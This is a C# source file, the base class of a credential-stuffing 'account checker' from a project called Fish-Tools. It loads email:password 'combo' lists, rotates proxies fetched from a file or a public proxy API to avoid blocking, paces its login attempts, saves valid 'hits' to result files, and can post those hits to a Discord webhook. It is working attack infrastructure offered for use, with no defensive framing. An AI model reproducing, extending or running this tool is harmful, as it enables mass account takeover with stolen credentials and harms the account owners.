/*
------------------------------------------------------------
Made By notfishvr
github: https://github.com/official-notfishvr/Fish-Tools
------------------------------------------------------------
*/
using Fish_Tools.core.Utils;
using Newtonsoft.Json;
using System.Text;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    public abstract class BaseAccountChecker
    {
        protected string CombosFile { get; set; }
        protected string HitsFile { get; set; }
        protected string HitsFileDetailed { get; set; }
        protected bool UsingDiscord { get; set; }
        protected string DiscordWebHook { get; set; }
        protected int CooldownTime { get; set; } = 350;
        protected int MaxRetries { get; set; } = 3;
        protected bool EnableRetry { get; set; } = false;
        protected int TotalCombos { get; set; }
        protected int ProcessedCombos { get; set; }
        protected int Hits { get; set; }
        protected int Bads { get; set; }
        protected int Errors { get; set; }
        protected DateTime StartTime { get; set; }
        protected bool IsRunning { get; set; }
        protected List<string> Proxies { get; set; } = new List<string>();
        protected int ProxyIndex { get; set; } = 0;
        protected bool UseProxies { get; set; } = false;
        protected object ProxyLock = new object();

        protected BaseAccountChecker(string serviceName)
        {
            HitsFile = $"Result/{serviceName}Hits.txt";
            HitsFileDetailed = $"Result/{serviceName}Hits [Detailed].txt";
            InitializeFiles();
        }

        protected virtual void InitializeFiles()
        {
            Directory.CreateDirectory("Result");
            if (!File.Exists(HitsFile)) File.Create(HitsFile).Close();
            if (!File.Exists(HitsFileDetailed)) File.Create(HitsFileDetailed).Close();
        }

        public virtual void Main(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();

            if (!GetUserInputs(logger))
                return;

            if (!LoadCombos(logger))
                return;

            if (!ConfirmContinue(logger))
                return;

            StartChecking(logger);
        }

        protected virtual bool GetUserInputs(Logger logger)
        {
            logger.Info("Please provide the path to your combos file:");
            logger.Info("Expected format: email:password (one per line)");
            Console.Write("-> ");
            CombosFile = Console.ReadLine();

            while (string.IsNullOrWhiteSpace(CombosFile) || !File.Exists(CombosFile))
            {
                logger.Error("Invalid path or file does not exist. Please try again:");
                Console.Write("-> ");
                CombosFile = Console.ReadLine();
            }

            logger.Info("If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank:");
            Console.Write("-> ");
            string discord = Console.ReadLine();
            UsingDiscord = !string.IsNullOrWhiteSpace(discord);
            DiscordWebHook = discord;

            GetAdditionalSettings(logger);

            return true;
        }

        protected virtual void GetAdditionalSettings(Logger logger)
        {
            // Proxy support
            logger.Info("Do you want to use proxies for account checking? (y/n):");
            Console.Write("-> ");
            string useProxies = Console.ReadLine()?.ToLower();
            UseProxies = useProxies == "y" || useProxies == "yes";
            if (UseProxies)
            {
                logger.Info("Enter the path to your proxy list file, or a proxy API URL (e.g. https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all):");
                Console.Write("-> ");
                string proxySource = Console.ReadLine();
                if (!string.IsNullOrWhiteSpace(proxySource))
                {
                    if (proxySource.StartsWith("http://") || proxySource.StartsWith("https://"))
                    {
                        try
                        {
                            logger.Info($"Fetching proxies from API: {proxySource}");
                            using (var httpClient = new System.Net.Http.HttpClient())
                            {
                                var response = httpClient.GetAsync(proxySource).Result;
                                if (response.IsSuccessStatusCode)
                                {
                                    var proxyText = response.Content.ReadAsStringAsync().Result;
                                    Proxies = proxyText.Split(new[] { "\r\n", "\n", "\r" }, System.StringSplitOptions.RemoveEmptyEntries)
                                        .Select(line => line.Trim())
                                        .Where(line => !string.IsNullOrWhiteSpace(line))
                                        .ToList();
                                    if (Proxies.Count > 0)
                                    {
                                        logger.Success($"Fetched {Proxies.Count} proxies from API.");
                                    }
                                    else
                                    {
                                        logger.Warn("API returned no proxies. No proxies will be used.");
                                        UseProxies = false;
                                    }
                                }
                                else
                                {
                                    logger.Warn($"Failed to fetch proxies from API. Status: {response.StatusCode}. No proxies will be used.");
                                    UseProxies = false;
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            logger.Warn($"Error fetching proxies from API: {ex.Message}. No proxies will be used.");
                            UseProxies = false;
                        }
                    }
                    else if (System.IO.File.Exists(proxySource))
                    {
                        Proxies = System.IO.File.ReadAllLines(proxySource)
                            .Select(line => line.Trim())
                            .Where(line => !string.IsNullOrWhiteSpace(line))
                            .ToList();
                        if (Proxies.Count > 0)
                        {
                            logger.Success($"Loaded {Proxies.Count} proxies from file.");
                        }
                        else
                        {
                            logger.Warn("Proxy file is empty. No proxies will be used.");
                            UseProxies = false;
                        }
                    }
                    else
                    {
                        logger.Warn("Proxy file not found or invalid input. No proxies will be used.");
                        UseProxies = false;
                    }
                }
                else
                {
                    logger.Warn("No proxy source provided. No proxies will be used.");
                    UseProxies = false;
                }
            }
        }

        protected virtual bool LoadCombos(Logger logger)
        {
            try
            {
                string[] combos = File.ReadAllLines(CombosFile)
                    .Select(line => line.Trim())
                    .Where(line => !string.IsNullOrWhiteSpace(line))
                    .ToArray();

                if (combos.Length == 0)
                {
                    logger.Error("No valid combos detected in the file.");
                    return false;
                }

                int validCombos = 0;
                foreach (var combo in combos)
                {
                    var parts = ParseCombo(combo);
                    if (parts != null)
                    {
                        validCombos++;
                    }
                    else
                    {
                        logger.Warn($"Invalid combo format: {combo}");
                    }
                }

                if (validCombos == 0)
                {
                    logger.Error("No valid combos found. Expected format: email:password");
                    return false;
                }

                TotalCombos = validCombos;
                logger.Success($"Loaded {TotalCombos} valid combos out of {combos.Length} total lines.");

                if (validCombos < combos.Length)
                {
                    logger.Warn($"Skipped {combos.Length - validCombos} invalid combos.");
                }

                return true;
            }
            catch (Exception ex)
            {
                logger.Error($"Error loading combos: {ex.Message}");
                return false;
            }
        }

        protected virtual bool ConfirmContinue(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();

            logger.Info($"Ready to check {TotalCombos} combos");
            logger.Info($"Hits will be saved to: {HitsFile}");
            logger.Info($"Detailed hits will be saved to: {HitsFileDetailed}");
            if (UsingDiscord)
                logger.Info("Discord webhook is configured");

            logger.Info("Press any key to start checking...");
            Console.ReadKey();
            return true;
        }

        protected virtual void StartChecking(Logger logger)
        {
            IsRunning = true;
            StartTime = DateTime.Now;

            Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true;
                IsRunning = false;
                logger.Warn("Stopping account checker...");
            };

            logger.Info("Starting account checker...");
            logger.Info($"Total combos: {TotalCombos}");
            logger.Info($"Cooldown: {CooldownTime}ms");
            logger.Info($"Max retries: {MaxRetries}");
            logger.Info("Press Ctrl+C to stop");
            Console.WriteLine();

            Task.Run(async () =>
            {
                try
                {
                    logger.Info($"Reading combos from: {CombosFile}");
                    string[] allCombos = File.ReadAllLines(CombosFile)
                        .Select(line => line.Trim())
                        .Where(line => !string.IsNullOrWhiteSpace(line))
                        .ToArray();

                    var validCombos = allCombos.Where(combo => ParseCombo(combo) != null).ToArray();

                    logger.Info($"Loaded {validCombos.Length} valid combos to process");

                    foreach (var combo in validCombos)
                    {
                        if (!IsRunning)
                        {
                            logger.Warn("Checking stopped by user");
                            break;
                        }

                        logger.Info($"Processing combo {ProcessedCombos + 1}/{TotalCombos}: {combo}");
                        await ProcessCombo(combo, logger);
                        ProcessedCombos++;
                        UpdateProgress(logger);

                        if (CooldownTime > 0)
                        {
                            logger.Info($"Waiting {CooldownTime}ms before next combo...");
                            await Task.Delay(CooldownTime);
                        }
                    }

                    ShowFinalResults(logger);
                }
                catch (Exception ex)
                {
                    logger.Error($"Error during checking: {ex.Message}");
                    logger.Error($"Stack trace: {ex.StackTrace}");
                }
                finally
                {
                    IsRunning = false;
                    logger.Info("Press any key to return to main menu...");
                    Console.ReadKey();
                }
            }).Wait();
        }

        protected abstract Task ProcessCombo(string combo, Logger logger);

        protected virtual void UpdateProgress(Logger logger)
        {
            if (ProcessedCombos % 10 == 0 || ProcessedCombos == TotalCombos)
            {
                var elapsed = DateTime.Now - StartTime;
                var rate = ProcessedCombos > 0 ? elapsed.TotalSeconds / ProcessedCombos : 0;
                var remaining = (TotalCombos - ProcessedCombos) * rate;

                Console.Title = $"Fish Tools | Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Bads: {Bads} | Errors: {Errors} | ETA: {TimeSpan.FromSeconds(remaining):mm\\:ss}";

                logger.Info($"Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Bads: {Bads} | Errors: {Errors} | Rate: {rate:F2}s/combo");
            }
        }

        protected virtual void ShowFinalResults(Logger logger)
        {
            var elapsed = DateTime.Now - StartTime;

            Console.WriteLine();
            logger.Success("=== CHECKING COMPLETED ===");
            logger.Info($"Total combos: {TotalCombos}");
            logger.Info($"Hits: {Hits}");
            logger.Info($"Bads: {Bads}");
            logger.Info($"Errors: {Errors}");
            logger.Info($"Success rate: {(double)Hits / TotalCombos * 100:F2}%");
            logger.Info($"Total time: {elapsed:hh\\:mm\\:ss}");
            logger.Info($"Average rate: {elapsed.TotalSeconds / TotalCombos:F2}s/combo");
            logger.Info($"Hits saved to: {HitsFile}");
            logger.Info($"Detailed hits saved to: {HitsFileDetailed}");
        }

        protected virtual async Task SendDiscordNotification(string message)
        {
            if (!UsingDiscord || string.IsNullOrWhiteSpace(DiscordWebHook))
                return;

            try
            {
                using (var httpClient = new HttpClient())
                {
                    httpClient.Timeout = TimeSpan.FromSeconds(10);
                    var payload = new
                    {
                        content = message,
                        embeds = (object)null,
                        attachments = new object[] { }
                    };

                    var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                    var response = await httpClient.PostAsync(DiscordWebHook, content);

                    if (!response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"Discord webhook failed: {response.StatusCode}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to send Discord notification: {ex.Message}");
            }
        }

        protected virtual void SaveHit(string hitInfo, string detailedInfo = null)
        {
            try
            {
                File.AppendAllText(HitsFile, hitInfo + Environment.NewLine);
                if (!string.IsNullOrEmpty(detailedInfo))
                    File.AppendAllText(HitsFileDetailed, detailedInfo + Environment.NewLine);
                Hits++;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to save hit: {ex.Message}");
            }
        }

        protected virtual void SaveBad(string combo, string reason = null)
        {
            Bads++;
        }

        protected virtual void SaveError(string combo, string error)
        {
            Errors++;
        }

        protected virtual async Task<bool> RetryOperation(Func<Task> operation, string combo, Logger logger, int currentRetry = 0)
        {
            if (!EnableRetry || currentRetry >= MaxRetries)
                return false;

            try
            {
                await operation();
                return true;
            }
            catch (Exception ex)
            {
                if (ShouldRetry(ex) && currentRetry < MaxRetries)
                {
                    logger.Warn($"[Retry {currentRetry + 1}/{MaxRetries}] {combo} | Error: {ex.Message}");
                    await Task.Delay(CooldownTime * (currentRetry + 1));
                    return await RetryOperation(operation, combo, logger, currentRetry + 1);
                }
                return false;
            }
        }

        protected virtual bool ShouldRetry(Exception ex)
        {
            return false;
        }

        protected virtual string[] ParseCombo(string combo)
        {
            var parts = combo.Split(':');
            if (parts.Length >= 2)
            {
                return new string[] { parts[0].Trim(), parts[1].Trim() };
            }
            return null;
        }

        protected string GetNextProxy()
        {
            if (!UseProxies || Proxies.Count == 0)
                return null;
            lock (ProxyLock)
            {
                var proxy = Proxies[ProxyIndex];
                ProxyIndex = (ProxyIndex + 1) % Proxies.Count;
                return proxy;
            }
        }
    }
}